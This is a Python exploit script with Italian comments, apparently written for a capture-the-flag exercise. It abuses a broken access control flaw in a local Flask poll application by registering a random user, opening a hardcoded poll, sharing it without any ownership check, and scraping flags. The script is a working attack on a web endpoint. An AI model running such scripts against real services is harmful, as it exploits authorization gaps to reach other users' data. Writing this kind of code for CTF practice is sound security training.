'''

Vulnerabilità: Broken Access Control / Security Misconfiguration
L'obiettivo di questo exploit/attacco è quello di condividere un sondaggio accedendo come (nuovo) utente che non
è il proprietario del sondaggio stesso.
Una volta recuperata la lista dei poll_ids, iterando su ognuno di essi, si visualizza il sondaggio corrispondente al corrente
poll_id e si tenta la condivisione. 
L'operazione dovrebbe avere successo in quanto nel codice dell'applicazione manca un controllo che verifica se l'utente
che sta cercando di condividere il sondaggio è il proprietario di quest ultimo.

'''


import requests
import random
import string
import re

# IP locale e port per il server Flask
ip = "127.0.0.1"
port = 5000

# Regex per cercare la flag: ricordiamo che una flag è una stringa alfanumerica di 31 caratteri seguiti da un =
flag_regex = re.compile(r"[A-Z0-9]{31}=")



def exploit():
    try:
        # Generazione casuale di un utente
        username_length = random.randint(5, 64)
        password_length = random.randint(5, 64)
        username = ''.join(random.choices(string.ascii_letters + string.digits, k = username_length))
        password = ''.join(random.choices(string.ascii_letters + string.digits, k = password_length))

        print(f"Registrando l'utente con username: {username} e password: {password}")
        utente = {
            'utente': username,
            'password': password
        }

        # Creiamo una sessione per l'utente
        s = requests.Session()

        # Registrazione dell'utente
        register_response = s.post(f"http://{ip}:{port}/register", data = utente)
        print(f"Status code della registrazione: {register_response.status_code}")
        if register_response.status_code != 200:
            print(f"Errore durante la registrazione per {username}")
            

        # Login dell'utente
        login_response = s.post(f"http://{ip}:{port}/login", data = utente)
        print(f"Status code del login: {login_response.status_code}")
        if login_response.status_code != 200:
            print(f"Errore durante il login per {username}")
            
        
        # Qui va implementata la logica vera e propria dell'exploit; essendo questa una prova supponiamo di 
        # conoscere già l'id del sondaggio che ci interessa

        # Visualizzazione del sondaggio
        poll_response = s.get(f"http://{ip}:{port}/show_poll/69d8239d955ba0a9")
        print(f"Status code della visualizzazione del sondaggio: {poll_response.status_code}")          
        if poll_response.status_code == 200:
            
            # Proviamo a condividere il sondaggio
            share_response = s.get(f"http://{ip}:{port}/share_poll/69d8239d955ba0a9")
            print(f"Status code della condivisione del sondaggio: {share_response.status_code}")
            if share_response.status_code == 200:
                
                # Se il sondaggio è stato trovato, si cerca all'interno della pagina per trovare le flag
                # La funzione findall restituisce una lista di stringhe che potrebbero contenere duplicati:
                # per evitare ciò convertiamo la lista in un set
                flags = set(flag_regex.findall(poll_response.text))  
                print(f"Trovate flag da {ip}: {flags}")


    except Exception as e:
        print(f"Errore durante l'exploit per {ip}: {str(e)}")





# Esecuzione dell'exploit
if __name__ == '__main__':
    exploit()
